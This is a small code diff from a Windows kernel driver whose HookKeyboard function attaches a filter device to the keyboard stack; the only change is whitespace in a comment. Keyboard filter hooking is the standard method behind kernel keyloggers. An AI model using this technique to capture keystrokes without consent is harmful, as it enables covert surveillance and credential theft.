@@ -33,7 +33,7 @@ NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject) {
 	
 	//Attach to the lower driver.
 	IoAttachDevice(pKeyboardDeviceObject, &uKeyboardDeviceName, &pKeyboardDeviceExtension->pKeyboardDevice);
-	RtlFreeUnicodeString(&uKeyboardDeviceName); //Release alloc memory.
+	RtlFreeUnicodeString(&uKeyboardDeviceName); // Release alloc memory.
 	DbgPrint("Filter Device attached successfully.\n");
 
 	return STATUS_SUCCESS;
